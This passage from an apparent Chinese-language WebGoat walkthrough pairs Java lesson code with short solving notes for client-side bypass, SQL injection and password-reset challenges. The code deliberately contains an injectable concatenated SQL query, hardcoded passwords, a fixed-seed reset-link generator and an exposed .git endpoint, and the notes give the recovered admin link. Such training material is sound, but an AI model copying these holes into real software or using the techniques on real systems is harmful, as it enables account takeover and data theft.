                        " this exercise the right way!</body></html>";
            }
            return success(this).feedback("ssrf.success")
                    .output(html).build();
        }
        var html = "<img class=\"image\" alt=\"image post\" src=\"images/cat.jpg\">";
        return getFailedResult(html);
    }

    private AttackResult getFailedResult(String errorMsg) {
        return failed(this).feedback("ssrf.failure")
                .output(errorMsg).build();
    }
}
```

![image-20220915144348783](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915144348783.png)

![image-20220915144451836](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915144451836.png)

## bypass_restrictions

### BypassRestrictions

```java
package com.wanan.webgoat.lessons.bypass_restrictions;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class BypassRestrictions extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.CLIENT_SIDE;
    }

    @Override
    public String getTitle() {
        return "bypass-restrictions.title";
    }
}
```

### BypassRestrictionsFieldRestrictions

```java
package com.wanan.webgoat.lessons.bypass_restrictions;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class BypassRestrictionsFieldRestrictions extends AssignmentEndpoint {
    @PostMapping("/BypassRestrictions/FieldRestrictions")
    @ResponseBody
    public AttackResult completed(@RequestParam String select,@RequestParam String radio,@RequestParam String checkbox,
                                  @RequestParam String shortInput,@RequestParam String readOnlyInput){
        if (select.equals("option1") || select.equals("option2")){
            return failed(this).build();
        }
        if (radio.equals("option1") || radio.equals("option2")){
            return failed(this).build();
        }
        if (checkbox.equals("on") || checkbox.equals("off")){
            return failed(this).build();
        }
        if (shortInput.length() <= 5){
            return failed(this).build();
        }
        if ("change".equals(readOnlyInput)){
            return failed(this).build();
        }
        return success(this).build();
    }

}
```

这一关比较简单 但是题目说的不是很清楚

意思就是跳过前段验证

![image-20220915210635708](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915210635708.png)

### BypassRestrictionsFrontendValidation

```java
package com.wanan.webgoat.lessons.bypass_restrictions;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class BypassRestrictionsFrontendValidation extends AssignmentEndpoint {

    @PostMapping("/BypassRestrictions/frontendValidation")
    @ResponseBody
    public AttackResult completed(@RequestParam String field1, @RequestParam String field2, @RequestParam String field3, @RequestParam String field4, @RequestParam String field5, @RequestParam String field6, @RequestParam String field7, @RequestParam Integer error){
        final String regex1 = "^[a-z]{3}$";
//        匹配 以A-Z开头总共三位并且是以这个开头和结尾的字符 类似 abc
        final String regex2 = "^[0-9]{3}$";
//        数字
        final String regex3 = "^[a-zA-Z0-9]*$";
//        匹配以 a-z A-Z 0-9 开头结尾的0个或多个字符
        final String regex4 = "^(one|two|three|four|five|six|seven|eight|nine)$";
//        匹配以 这些中一个为开头结尾的字符
        final String regex5 = "^\\d{5}$";
//        匹配以 数字开头结尾的5个字符
        final String regex6 = "^\\d{5}(-\\d{4})?$";
//        匹配类似 12345-1234 或 12345 的字符
        final String regex7 = "^[2-9]\\d{2}-?\\d{3}-?\\d{4}$";
//        匹配类似 233-333-4444 233-3334444 2333334444 这样的字符
        if (error > 0){
            return failed(this).build();
        }
        if (field1.matches(regex1)){
            return failed(this).build();
        }
        if (field2.matches(regex2)){
            return failed(this).build();
        }
        if (field3.matches(regex3)){
            return failed(this).build();
        }
        if (field4.matches(regex4)){
            return failed(this).build();
        }
        if (field5.matches(regex5)){
            return failed(this).build();
        }
        if (field6.matches(regex6)){
            return failed(this).build();
        }
        if (field7.matches(regex7)){
            return failed(this).build();
        }
        return success(this).build();

    }
}
```

这关要绕过正则 记得把error归零

![image-20220915213438199](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915213438199.png)

## client_side_filtering

### ClientSideFiltering

```java
package com.wanan.webgoat.lessons.client_side_filtering;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class ClientSideFiltering extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.CLIENT_SIDE;
    }

    @Override
    public String getTitle() {
        return "client.side.filtering.title";
    }
}
```

### ClientSideFilteringAssignment

```java
package com.wanan.webgoat.lessons.client_side_filtering;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"ClientSideFilteringHint1", "ClientSideFilteringHint2", "ClientSideFilteringHint3", "ClientSideFilteringHint4"})
public class ClientSideFilteringAssignment extends AssignmentEndpoint {
    @PostMapping("/clientSideFiltering/attack1")
    @ResponseBody
    public AttackResult completed(@RequestParam String  answer){
        return "450000".equals(answer) ? success(this).feedback("assignment.solved").build():
                failed(this).feedback("ClientSideFiltering.incorrect").build();
    }
}
```

### Salaries

```java
package com.wanan.webgoat.lessons.client_side_filtering;

import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.io.ClassPathResource;
import org.springframework.util.FileCopyUtils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;

import javax.annotation.PostConstruct;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathExpressionException;
import javax.xml.xpath.XPathFactory;
import java.io.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@RestController
@Slf4j
public class Salaries {
    @Value("${webgoat.user.directory}")
    private String webGoatHomeDirectory;
    @PostConstruct
    public void copyFiles(){
        ClassPathResource classPathResource = new ClassPathResource("lessons/employees.xml");
//        首先从classpath 中读取employees.xm文件
        File targetDirectory = new File(webGoatHomeDirectory, "/ClientSideFiltering");
//        新建一个目标问阿金
        if (!targetDirectory.exists()){
            targetDirectory.mkdir();
//            创建文件夹
        }
        try {
            FileCopyUtils.copy(classPathResource.getInputStream(),new FileOutputStream(new File(targetDirectory,"employees.xml")));
//            将文件复制进去
        }catch (IOException e){
            throw new RuntimeException(e);
        }
    }

    @GetMapping("clientSideFiltering/salaries")
//    这里其实只要是get请求就会执行 不管有没有参数
    @ResponseBody
    public List<Map<String,Object>> invoke(){
        NodeList nodes = null;
        File d = new File(webGoatHomeDirectory,"ClientSideFiltering/employees.xml");
//        新建一个employees.xml对象
        XPathFactory factory = XPathFactory.newInstance();
//          获得一个xml解析对象
        XPath path = factory.newXPath();

        try (InputStream is = new FileInputStream(d)){
//            首先从创建一个文件读入流
            InputSource inputStream = new InputSource(is);
//            创建一个新的字节输入流
            StringBuffer sb = new StringBuffer();
//            这里的sb 其实就对应着xml 中的节点名称
            sb.append("/Employees/Employee/UserID | ");
            sb.append("/Employees/Employee/FirstName | ");
            sb.append("/Employees/Employee/LastName | ");
            sb.append("/Employees/Employee/SSN | ");
            sb.append("/Employees/Employee/Salary ");
            String expression = sb.toString();
            nodes = (NodeList) path.evaluate(expression,inputStream, XPathConstants.NODESET);
//            这里对应节点进行解析

        }catch (XPathExpressionException e){
            log.error("Unable to parse xml",e);
        }catch (IOException e){
            log.error("Unable to read employees.xml at location: '{}'",d);
        }
        int columns = 5;
        List json = new ArrayList();
        java.util.Map<String,Object> employeeJson = new HashMap<>();
        for (int i = 0; i < nodes.getLength(); i ++ ){
            if (i % columns == 0){
                employeeJson = new HashMap<>();
                json.add(employeeJson);
            }
            Node node = nodes.item(i);
            employeeJson.put(node.getNodeName(),node.getTextContent());
        }
//        将数据填入到map中
        return json;
    }

}
```

这里的sb需要对应着xml文件去看

![image-20220915221640970](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915221640970.png)

这里需要的是在众多的请求中找到这个请求信息

![image-20220915223520300](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915223520300.png)

![image-20220915223538290](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915223538290.png)

### ClientSideFilteringFreeAssignment

```java
package com.wanan.webgoat.lessons.client_side_filtering;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"client.side.filtering.free.hint1", "client.side.filtering.free.hint2", "client.side.filtering.free.hint3"})
public class ClientSideFilteringFreeAssignment extends AssignmentEndpoint {
    public static final String SUPER_COUPON_CODE = "get_it_for_free";
    @PostMapping("/clientSideFiltering/getItForFree")
    @ResponseBody
    public AttackResult completed(@RequestParam String checkoutCode){
        if (SUPER_COUPON_CODE.equals(checkoutCode)){
            return success(this).build();
        }
        return failed(this).build();
    }
}
```

同样找请求信息

![image-20220915231851586](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915231851586.png)

![image-20220915231859141](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915231859141.png)

![image-20220915231913308](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915231913308.png)

## html_tampering

### HtmlTampering

```java
package com.wanan.webgoat.lessons.html_tampering;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class HtmlTampering extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.CLIENT_SIDE;
    }

    @Override
    public String getTitle() {
        return "html-tampering.title";
    }
}
```

### HtmlTamperingTask

```java
package com.wanan.webgoat.lessons.html_tampering;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"hint1", "hint2", "hint3"})
public class HtmlTamperingTask extends AssignmentEndpoint {

    @PostMapping("/HtmlTampering/task")
    @ResponseBody
    public AttackResult completed(@RequestParam String QTY,@RequestParam String Total){
        if (Float.parseFloat(QTY) * 2999.99 > Float.parseFloat(Total) +1){
            return success(this).feedback("html-tampering.tamper.success").build();
        }
        return failed(this).feedback("html-tampering.tamper.failure").build();
    }
}
```

没意思

![image-20220916124938043](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916124938043.png)

## challenges

### ChallengeIntro

```java
package com.wanan.webgoat.lessons.challenges;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;

public class ChallengeIntro extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.CHALLENGE;
    }

    @Override
    public String getTitle() {
        return "challenge0.title";
    }
}
```

### Flag

```java
package com.wanan.webgoat.lessons.challenges;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.WebSession;
import com.wanan.webgoat.container.users.UserTracker;
import com.wanan.webgoat.container.users.UserTrackerRepository;
import lombok.AllArgsConstructor;
import lombok.Getter;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import javax.annotation.PostConstruct;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;
import java.util.stream.IntStream;

@RestController
public class Flag extends AssignmentEndpoint {
    public static final Map<Integer,String> FLAGS = new HashMap<>();

    @Autowired
    private UserTrackerRepository userTrackerRepository;
    @Autowired
    private WebSession webSession;

    @AllArgsConstructor
    private class FlagPosted{
        @Getter
        private boolean lessonCompleted;

    }

    @PostConstruct
    public void initFlags(){
        IntStream.range(1,10).forEach(i -> FLAGS.put(i, UUID.randomUUID().toString()));
    }

    @RequestMapping(path = "/challenge/flag",method = RequestMethod.POST,produces = MediaType.APPLICATION_JSON_VALUE)
    @ResponseBody
    public AttackResult postFlag(@RequestParam String flag){
        UserTracker userTracker = userTrackerRepository.findByUser(webSession.getUserName());
        String currentChallenge = webSession.getCurrentLesson().getName();
        int challengeNumber = Integer.valueOf(currentChallenge.substring(currentChallenge.length() -1,currentChallenge.length()));
//        截取是第几关
        String expectedFlag = FLAGS.get(challengeNumber);
        final AttackResult attackResult;
        if (expectedFlag.equals(flag)){
            userTracker.assignmentSolved(webSession.getCurrentLesson(),"Assignment" + challengeNumber);
            attackResult  = success(this).feedback("challenge.flag.correct").build();
        }else {
            userTracker.assignmentFailed(webSession.getCurrentLesson());
            attackResult = failed(this).feedback("challenge.flag.incorrect").build();
        }
        userTrackerRepository.save(userTracker);
        return attackResult;

    }
}
```

### SolutionConstants

```java
package com.wanan.webgoat.lessons.challenges;

public interface SolutionConstants {
    String PASSWORD = "!!webgoat_admin_1234!!";
    String PASSWORD_TOM = "thisisasecretfortomonly";
    String ADMIN_PASSWORD_LINK = "375afe1104f4a487a73823c50a9292a2";
}
```

### challenge1

#### Challenge1

```java
package com.wanan.webgoat.lessons.challenges.challenge1;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class Challenge1 extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.CHALLENGE;
    }

    @Override
    public String getTitle() {
        return "challenge1.title";
    }
}

```

#### ImageServlet

```java
package com.wanan.webgoat.lessons.challenges.challenge1;

import org.springframework.core.io.ClassPathResource;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServlet;
import java.io.IOException;
import java.security.SecureRandom;

import static org.springframework.web.bind.annotation.RequestMethod.GET;
import static org.springframework.web.bind.annotation.RequestMethod.POST;

@RestController
public class ImageServlet extends HttpServlet {
    private static final long serialVersionUID = 9132775506936676850L;
    static final public int PINCODE = new SecureRandom().nextInt(10000);

    @RequestMapping(method = {GET,POST},value = "/challenge/logo",produces = MediaType.IMAGE_PNG_VALUE)
    @ResponseBody
    public byte[] logo() throws IOException{
        byte[] in = new ClassPathResource("lessons/challenges/images/webgoat2.png").getInputStream().readAllBytes();
        String pincode = String.format("%04d",PINCODE);

        in[81216] = (byte)pincode.charAt(0);
        in[81217] = (byte)pincode.charAt(1);
        in[81218] = (byte)pincode.charAt(2);
        in[81219] = (byte)pincode.charAt(3);
        return in;
    }
}
```

#### Assignment1

```java
package com.wanan.webgoat.lessons.challenges.challenge1;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.lessons.challenges.Flag;
import org.springframework.security.core.parameters.P;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;

import static com.wanan.webgoat.lessons.challenges.SolutionConstants.PASSWORD;

@RestController
public class Assignment1 extends AssignmentEndpoint {
    @PostMapping("/challenge/1")
    @ResponseBody
    public AttackResult completed(@RequestParam String username, @RequestParam String password, HttpServletRequest request){
        boolean ipAddressKnown = true;
        boolean passwordCorrect = "admin".equals(username) && PASSWORD.replace("1234",String.format("%04d",ImageServlet.PINCODE)).equals(password);
        if (passwordCorrect && ipAddressKnown) {
            return success(this).feedback("challenge.solved").feedbackArgs(Flag.FLAGS.get(1)).build();

        }else if (passwordCorrect) {
            return failed(this).feedback("ip.address.unknown").build();
        }
        return failed(this).build();
    }
    public static boolean containsHeader(HttpServletRequest request){
        return StringUtils.hasText(request.getHeader("X-Forwarded-For"));
    }
}
```

![image-20220916161838205](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916161838205.png)

![image-20220916161845528](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916161845528.png)

![image-20220916161913369](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916161913369.png)

### challenge5

#### Challenge5

```java
package com.wanan.webgoat.lessons.challenges.challenge5;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class Challenge5 extends Lesson {

    @Override
    public Category getDefaultCategory() {
        return Category.CHALLENGE;
    }

    @Override
    public String getTitle() {
        return "challenge5.title";
    }
}
```

#### Assignment5

```java
package com.wanan.webgoat.lessons.challenges.challenge5;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.lessons.challenges.Flag;
import lombok.extern.slf4j.Slf4j;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.sql.PreparedStatement;
import java.sql.ResultSet;

@RestController
@Slf4j
public class Assignment5 extends AssignmentEndpoint {
    private final LessonDataSource dataSource;
    public Assignment5(LessonDataSource dataSource){
        this.dataSource = dataSource;
    }
    @PostMapping("/challenge/5")
    @ResponseBody
    public AttackResult login(@RequestParam String username_login,@RequestParam String password_login)throws Exception{
        if (!StringUtils.hasText(username_login) || !StringUtils.hasText(password_login)){
            return failed(this).feedback("required4").build();
        }
        if (!"Larry".equals(username_login)){
            return failed(this).feedback("user.not.larry").feedbackArgs(username_login).build();
        }
        try (var connection = dataSource.getConnection()){
            PreparedStatement statement = connection.prepareStatement("select password from challenge_users where userid = '" + username_login + "' and password = '" + password_login + "'");
            ResultSet resultSet = statement.executeQuery();
            if (resultSet.next()){
                return success(this).feedback("challenge.solved").feedbackArgs(Flag.FLAGS.get(5)).build();
            }else {
                return failed(this).feedback("challenge.close").build();
            }

        }
    }
}
```



![image-20220916164043242](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916164043242.png)

### challenge7

#### Challenge7

```java
package com.wanan.webgoat.lessons.challenges.challenge7;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class Challenge7 extends Lesson {

    @Override
    public Category getDefaultCategory() {
        return Category.CHALLENGE;
    }

    @Override
    public String getTitle() {
        return "challenge7.title";
    }
}
```

#### Email

```java
package com.wanan.webgoat.lessons.challenges.challenge7;

import lombok.Builder;
import lombok.Data;

import java.io.Serializable;
import java.time.LocalDateTime;

@Builder
@Data
public class Email implements Serializable {
    private LocalDateTime time;
    private String contents;
    private String sender;
    private String title;
    private String recipient;
}
```

#### MD5

MD5工具类

![image-20220916171722079](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916171722079.png)

#### PasswordResetLink

```java
package com.wanan.webgoat.lessons.challenges.challenge7;


import java.util.Random;

public class PasswordResetLink {
    public String createPasswordReset(String username,String key){
        Random random = new Random();
        if (username.equalsIgnoreCase("admin")){
            random.setSeed(key.length());
        }
        return scramble(random,scramble(random,scramble(random,MD5.getHashString(username))));
    }
    public static String scramble(Random random,String inputString){
        char[] a = inputString.toCharArray();
        for (int i = 0; i < a.length;i++){
            int j = random.nextInt(a.length);
            char temp = a[i];
            a[i] = a[j];
            a[j] = temp;
        }
        return new String(a);
    }
}
```

#### Assignment7

注意差异

![image-20220916180141412](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916180141412.png)

```java
package com.wanan.webgoat.lessons.challenges.challenge7;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.lessons.challenges.Flag;
import com.wanan.webgoat.lessons.challenges.SolutionConstants;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.io.ClassPathResource;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.client.RestTemplate;

import javax.servlet.http.HttpServletRequest;
import java.net.URI;
import java.net.URISyntaxException;
import java.time.LocalDateTime;

@RestController
@Slf4j
public class Assignment7 extends AssignmentEndpoint {
    private static final String TEMPLATE = "Hi, you requested a password reset link, please use this "
            + "<a target='_blank' href='%s:8080/WebGoat/challenge/7/reset-password/%s'>link</a> to reset your password."
            + "\n \n\n"
            + "If you did not request this password change you can ignore this message."
            + "\n"
            + "If you have any comments or questions, please do not hesitate to reach us at support@webgoat-cloud.org"
            + "\n\n"
            + "Kind regards, \nTeam WebGoat";
    @Autowired
    private RestTemplate restTemplate;
    @Value("${webwolf.mail.url}")
    private String webWolfMailURL;

    @GetMapping("/challenge/7/reset-password/{link}")
    public ResponseEntity<String > resetPassword(@PathVariable(value = "link") String link){
        if (link.equals(SolutionConstants.ADMIN_PASSWORD_LINK)){
            return ResponseEntity.accepted().body("<h1>Success!!</h1>"
                    + "<img src='/WebGoat/images/hi-five-cat.jpg'>"
                    + "<br/><br/>Here is your flag: " + "<b>" + Flag.FLAGS.get(7) + "</b>");
        }
        return ResponseEntity.status(HttpStatus.I_AM_A_TEAPOT).body("That is not the reset link for admin");

    }

    @PostMapping("/challenge/7")
    @ResponseBody
    public AttackResult sendPasswordResetLink(@RequestParam String email, HttpServletRequest request)throws URISyntaxException{
        if (StringUtils.hasText(email)){
            String username = email.substring(0,email.indexOf("@"));
            if (StringUtils.hasText(username)){
                URI uri = new URI(request.getRequestURI().toString());
                Email mail = Email.builder()
                        .title("Your password reset link for challenge 7")
                        .contents(String.format(TEMPLATE,uri.getScheme() + "://" + uri.getHost(),new PasswordResetLink().createPasswordReset(username,"webgoat")))
                        .sender("password-reset@webgoat-cloud.net")
                        .recipient(username)
                        .time(LocalDateTime.now()).build();
                restTemplate.postForEntity(webWolfMailURL,mail,Object.class);
            }
        }
        return success(this).feedback("email.send").feedbackArgs(email).build();
    }

    @GetMapping(value = "/challenge/7/.git",produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
//    源码泄露
    @ResponseBody
    public ClassPathResource git(){
        return new ClassPathResource("lessons/challenges/challenge7/git.zip");
    }

}

```

这里的话其他的地方是没什么问题的 问题出在这个admin的重置链接上面

我们跟到这里

![image-20220916175630366](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916175630366.png)

可以看到这里对random设置了一个 seed 并且这个值还是一个固定的值 那么这里会发生什么呢 ?

![image-20220916175659295](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916175659295.png)

没错 这里就会导致每次生成的随机数都是相同的 可以自行尝试  这里也就导致了最终的admin重置链接会是相同的 那么我们只需要拿到源码就可以获取到 admin的重置链接

![image-20220916175803866](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916175803866.png)

回到题目本身 首先我们需要获取到源码

![image-20220916180347308](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916180347308.png)

![image-20220916180510821](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916180510821.png)

打开之后是一个git 那么现在我们需要回档 于git的上级目录进行操作

```
git status
```

![image-20220916180639971](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916180639971.png)

```
git log
```

![image-20220916180735008](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916180735008.png)

```
git reset --hard
```

![image-20220916180823948](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916180823948.png)

直接拖进去反编译一下 这里其实不太好搞 首先我们的username 我们知道是 admin 那这里的key呢?   其实就在 var2中给定义好了

![image-20220916185301418](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916185301418.png)

拿到link

```
375afe1104f4a487a73823c50a9292a2
```

![image-20220916190033285](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916190033285.png)

```
http://127.0.0.1:8082/WebGoat/challenge/7/reset-password/375afe1104f4a487a73823c50a9292a2
```

![image-20220916190301274](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916190301274.png)

![image-20220916190314529](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916190314529.png)

### challenge8

#### Challenge8

```java
package com.wanan.webgoat.lessons.challenges.challenge8;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class Challenge8 extends Lesson {

    @Override
    public Category getDefaultCategory() {
        return Category.CHALLENGE;
    }

    @Override
    public String getTitle() {
        return "challenge8.title";
    }
}
```

#### Assignment8

```java
package com.wanan.webgoat.lessons.challenges.challenge8;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.lessons.challenges.Flag;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.util.HashMap;
import java.util.Map;
import java.util.stream.Collectors;

@RestController
@Slf4j
public class Assignment8 extends AssignmentEndpoint {
    private static final Map<Integer,Integer> votes = new HashMap<>();

    static {
        votes.put(1, 400);
        votes.put(2, 120);
        votes.put(3, 140);
        votes.put(4, 150);
        votes.put(5, 300);
    }
    @GetMapping(value = "/challenge/8/vote/{stars}",produces = MediaType.APPLICATION_JSON_VALUE)
    @ResponseBody
    public ResponseEntity<?> vote(@PathVariable(value = "stars") int nrOfStars , HttpServletRequest request){
        String msg = "";
        if (request.getMethod().equals("GET")){
            var json = Map.of("error", true, "message", "Sorry but you need to login first in order to vote");
            return ResponseEntity.status(200).body(json);
        }
        Integer allVotesForStar = votes.getOrDefault(nrOfStars,0);
        votes.put(nrOfStars,allVotesForStar +1);
        return ResponseEntity.ok().header("X-Flag","Thanks for voting, your flag is: " + Flag.FLAGS.get(8)).build();
    }

    @GetMapping("/challenge/8/votes/")
    public ResponseEntity<?> getVotes(){
        return ResponseEntity.ok(votes.entrySet().stream().collect(Collectors.toMap(e -> "" + e.getKey(),e-> e.getValue())));
    }

    @GetMapping("/challenge/8/votes/average")
    public ResponseEntity<Map<String ,Integer>> average(){
        int totalNumberOfVotes = votes.values().stream().mapToInt(i->i.intValue()).sum();
        int categories = votes.entrySet().stream().mapToInt(e->e.getKey() * e.getValue()).reduce(0,(a,b)->a+b);
        var json = Map.of("average", (int) Math.ceil((double) categories / totalNumberOfVotes));
        return ResponseEntity.ok(json);
    }
    @GetMapping("/challenge/8/notUsed")
    public AttackResult notUsed(){
        throw new IllegalStateException("Should never be called, challenge specific method");
    }
}
```

当投票时显示需要登录

![image-20220916204629963](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916204629963.png)

但是当请求为HEAD时可进入下一步操作

![image-20220916204718045](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916204718045.png)

![image-20220916204726635](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916204726635.png)

![image-20220916204742991](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916204742991.png)

# 结尾

通关了 除了有一关显示错误 一关不能做

![image-20220916205852859](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916205852859.png)

![image-20220916210005892](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916210005892.png)
